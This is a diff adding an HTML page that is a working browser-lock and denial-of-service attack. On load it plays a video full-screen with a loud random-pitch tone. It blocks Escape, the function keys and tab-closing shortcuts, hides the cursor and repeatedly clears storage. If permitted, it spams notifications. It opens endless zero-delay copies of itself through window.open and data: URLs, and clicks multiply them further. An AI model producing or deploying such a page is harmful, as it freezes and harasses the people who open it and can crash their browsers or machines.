@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        * { margin:0; padding:0; overflow:hidden; }
+        html, body {
+            background: #000;
+            cursor: none !important;
+            height: 100vh;
+            width: 100vw;
+        }
+        iframe {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://i.nuuls.com/_NbxQ.mp4" allowfullscreen></iframe>
+
+    <script>
+        const videoURL = "https://i.nuuls.com/_NbxQ.mp4";
+        const selfURL = window.location.href;
+
+        // FORCE MAX VOLUME (0 delay)
+        function maxVolume() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                gain.gain.value = 1.0;
+                osc.frequency.setValueAtTime(440, ctx.currentTime);
+                osc.start();
+                // Keep it annoying and loud
+                setInterval(() => {
+                    osc.frequency.setValueAtTime(200 + Math.random() * 800, ctx.currentTime);
+                }, 30);
+            } catch(e) {}
+        }
+
+        function forceFullscreen() {
+            const e = document.documentElement;
+            if (e.requestFullscreen) e.requestFullscreen().catch(() => {});
+            else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen().catch(() => {});
+        }
+
+        function hideCursor() {
+            document.documentElement.style.cursor = 'none !important';
+            document.body.style.cursor = 'none !important';
+        }
+
+        function enforce() {
+            forceFullscreen();
+            hideCursor();
+        }
+
+        function clearStorage() {
+            try { localStorage.clear(); sessionStorage.clear(); } catch(e){}
+        }
+
+        function blockMouse(e) {
+            if (e) { e.preventDefault(); e.stopImmediatePropagation(); }
+            hideCursor();
+            return false;
+        }
+
+        function blockKeys(e) {
+            if (["Escape","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"].includes(e.key) ||
+                e.keyCode >= 112 && e.keyCode <= 123 ||
+                (e.ctrlKey && ["w","r","t","n"].includes(e.key.toLowerCase()))) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+                forceFullscreen();
+                return false;
+            }
+        }
+
+        // NOTIFICATION SPAM (10000 "6" characters)
+        let notificationSpam = () => {
+            if (Notification.permission === "granted") {
+                new Notification("CHAOS", {
+                    body: "6".repeat(10000)
+                });
+                setTimeout(notificationSpam, 0); // 0 delay spam
+            }
+        };
+
+        // Request notification permission instantly
+        function requestNotifications() {
+            if (Notification.permission === "default") {
+                Notification.requestPermission().then(perm => {
+                    if (perm === "granted") {
+                        notificationSpam(); // start 0-delay spam if accepted
+                    }
+                });
+            } else if (Notification.permission === "granted") {
+                notificationSpam();
+            }
+        }
+
+        // Spawn chaos using data: URL (no srcdoc)
+        function spawnChaos() {
+            window.open(selfURL, '_blank');
+
+            const chaosHTML = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta charset="UTF-8">
+                    <title></title>
+                    <style>
+                        *{margin:0;padding:0;overflow:hidden;}
+                        html,body{background:#000;cursor:none!important;height:100vh;width:100vw;}
+                        iframe{position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;}
+                    </style>
+                </head>
+                <body>
+                    <iframe src="${videoURL}" allowfullscreen></iframe>
+                    <script>
+                        function maxVolume() {
+                            try {
+                                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                                const osc = ctx.createOscillator();
+                                const gain = ctx.createGain();
+                                osc.connect(gain);
+                                gain.connect(ctx.destination);
+                                gain.gain.value = 1.0;
+                                osc.frequency.setValueAtTime(440, ctx.currentTime);
+                                osc.start();
+                                setInterval(() => { osc.frequency.setValueAtTime(200 + Math.random() * 800, ctx.currentTime); }, 30);
+                            } catch(e) {}
+                        }
+                        function forceFullscreen() {
+                            const e = document.documentElement;
+                            if (e.requestFullscreen) e.requestFullscreen().catch(() => {});
+                            else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen().catch(() => {});
+                        }
+                        function hideCursor() {
+                            document.documentElement.style.cursor = 'none !important';
+                            document.body.style.cursor = 'none !important';
+                        }
+                        function enforce() { forceFullscreen(); hideCursor(); }
+                        function clearStorage() { try { localStorage.clear(); sessionStorage.clear(); } catch(e){} }
+
+                        function blockMouse(e) {
+                            if(e) { e.preventDefault(); e.stopImmediatePropagation(); }
+                            hideCursor();
+                            return false;
+                        }
+                        function blockKeys(e) {
+                            if (["Escape","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"].includes(e.key) ||
+                                e.keyCode >= 112 && e.keyCode <= 123 ||
+                                (e.ctrlKey && ["w","r","t","n"].includes(e.key.toLowerCase()))) {
+                                e.preventDefault(); e.stopImmediatePropagation(); forceFullscreen(); return false;
+                            }
+                        }
+
+                        function notificationSpam() {
+                            if (Notification.permission === "granted") {
+                                new Notification("CHAOS", { body: "6".repeat(10000) });
+                                setTimeout(notificationSpam, 0);
+                            }
+                        }
+
+                        function requestNotifications() {
+                            if (Notification.permission === "default") {
+                                Notification.requestPermission().then(perm => { if (perm === "granted") notificationSpam(); });
+                            } else if (Notification.permission === "granted") {
+                                notificationSpam();
+                            }
+                        }
+
+                        function replicate() {
+                            window.open('${selfURL}', '_blank');
+                            window.open('data:text/html,' + encodeURIComponent(document.documentElement.outerHTML), '_blank');
+                            setTimeout(replicate, 0);
+                        }
+
+                        // Start everything with 0 delay
+                        maxVolume();
+                        requestNotifications();
+                        replicate();
+                        setInterval(enforce, 15);
+                        setInterval(clearStorage, 0);
+                        enforce();
+
+                        document.addEventListener('keydown', blockKeys, true);
+                        document.addEventListener('contextmenu', blockMouse, true);
+                        document.addEventListener('mousedown', blockMouse, true);
+                        document.addEventListener('mousemove', hideCursor, true);
+                    <\/script>
+                </body>
+                </html>
+            `;
+
+            window.open('data:text/html,' + encodeURIComponent(chaosHTML), '_blank');
+        }
+
+        // Click = instant massive spam
+        function onAnyClick(e) {
+            if (e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            }
+            for (let i = 0; i < 10; i++) {
+                setTimeout(spawnChaos, i * 2);
+            }
+            return false;
+        }
+
+        // Automatic infinite 0-delay chaos
+        function infiniteChaos() {
+            spawnChaos();
+            setTimeout(infiniteChaos, 0);
+        }
+
+        // Initialize everything instantly
+        window.onload = function() {
+            maxVolume();
+            requestNotifications();
+            setInterval(enforce, 10);
+            setInterval(hideCursor, 5);
+            setInterval(clearStorage, 0);
+
+            // Mouse + click triggers (also spawns chaos)
+            document.addEventListener('contextmenu', onAnyClick, true);
+            document.addEventListener('mousedown', onAnyClick, true);
+            document.addEventListener('click', onAnyClick, true);
+            document.addEventListener('mousemove', hideCursor, true);
+
+            document.addEventListener('keydown', blockKeys, true);
+
+            enforce();
+            infiniteChaos(); // start full chaos immediately
+        };
+    </script>
+</body>
+</html>
